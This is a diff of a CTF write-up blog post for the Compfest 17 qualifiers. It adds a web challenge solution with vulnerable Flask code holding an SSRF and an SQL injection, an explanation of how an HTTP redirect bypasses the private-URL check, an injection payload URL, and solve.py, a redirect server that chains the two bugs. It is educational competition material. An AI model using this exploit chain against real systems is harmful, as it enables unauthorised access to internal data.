@@ -2,8 +2,8 @@
 date: 2025-09-01 18:03:00
 layout: post
 title: Compfest 17 Quals
-subtitle: Lorem ipsum dolor sit amet, consectetur adipisicing elit.
-description: Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.
+subtitle: Have fun Ctf national
+description: ikut untuk kedua kalinya di ctf compfest
 image: https://images6.alphacoders.com/135/1355194.jpeg
 optimized_image: https://images6.alphacoders.com/135/1355194.jpeg
 category: ctf
@@ -22,7 +22,6 @@ This is when the scoreboard was frozen. This write-up is incomplete because I on
 # Phantom-Thieves (Blockchain)
 ## Description
 
-> Author: Xymbol 
 > Let's infiltrate this place and make the greedy king got trapped!!
 
 ## Overview
@@ -155,8 +154,99 @@ else:
 
 # Dark Side Of Asteroid (Web Exploitation)
 ## Description
-> Author: jay
+
 > something seems wrong???
 
 ## Overview
+An attachment was provided with the following content:
 
+### app.py
+```python
+@app.route('/profile', methods=['GET', 'POST'])
+def profile():
+    if 'username' not in session:
+        return redirect(url_for('login'))
+
+    conn = get_db_connection()
+    error_preview = None
+    content_type = ''
+
+    if request.method == 'POST':
+        photo_url = request.form['photo_url']
+        try:
+            if is_private_url(photo_url):
+
+                  raise Exception("Direct access to internal host is forbidden.")
+
+            os.makedirs(os.path.join('static', 'uploads'), exist_ok=True)
+
+            resp = requests.get(photo_url, timeout=5)
+            content_type = resp.headers.get('Content-Type', '')
+            filename = f"{session['username']}_profile_fetched"
+            filepath = os.path.join('static', 'uploads', filename)
+
+# -------SNIPPET----------
+
+@app.route('/internal/admin/search')
+def internal_admin_search():
+    if request.remote_addr != '127.0.0.1':
+        return "Access denied", 403
+
+    conn = get_db_connection()
+    try:
+        search_raw = request.args.get('q', '')
+        if search_raw == '':
+            query = "SELECT secret_name, secret_value FROM admin_secrets WHERE access_level <= 2"
+        else:
+            search = filter_sqli(search_raw)
+            query = f"SELECT secret_name, secret_value FROM admin_secrets WHERE secret_name LIKE '{search}' AND access_level <= 2"
+
+        rows = conn.execute(query).fetchall()
+
+        result = ''
+        for row in rows:
+            result += f"{row['secret_name']}: {row['secret_value']}\n"
+        if not result:
+            result = "No secrets found"
+
+        return result, 200, {'Content-Type': 'text/plain; charset=utf-8'}
+    except Exception as e:
+        return f"Error: {str(e)}"
+    finally:
+        conn.close()
+
+def is_private_url(url: str):
+    hostname = urlparse(url).hostname
+    if not hostname:
+        return True
+    ip = socket.gethostbyname(hostname)
+    return ipaddress.ip_address(ip).is_private
+
+# -------SNIPPET----------
+```
+
+## solution
+**resp = requests.get(photo_url, timeout=5)** will cause the server to make an HTTP request to the URL we provide. This is an SSRF vulnerability. There is an **is_private_url(photo_url)** filter that prevents direct access to internal IP addresses such as 127.0.0.1. However, this filter can be bypassed using HTTP Redirect. The check is only performed on the initial URL, not on the destination URL after the redirect.
+
+**query = "SELECT secret_name, secret_value FROM admin_secrets WHERE access_level <= 2"** This is an SQL injection vulnerability in /internal/admin/search. This endpoint can only be accessed from 127.0.0.1 (localhost), so we have to use SSRF to reach it. The search parameter is entered directly into the query string, so we can “escape” the LIKE string and modify the query. 
+
+**Blacklist:** Prohibits words such as union, or, select, and spaces ( ).
+
+**Required:** Our payload must contain the string “access_level”
+so the payload will be like this *http://127.0.0.1:5000/internal/admin/search?q=%25%27%0A--access_level*
+
+### solve.py
+```python
+from flask import Flask, redirect
+
+app = Flask(__name__)
+
+@app.route('/')
+def do_redirect():
+    target_url = "http://127.0.0.1:5000/internal/admin/search?q=%25%27%0A--access_level"
+    print(f"Menerima request, me-redirect ke: {target_url}")
+    return redirect(target_url, code=302)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
+```
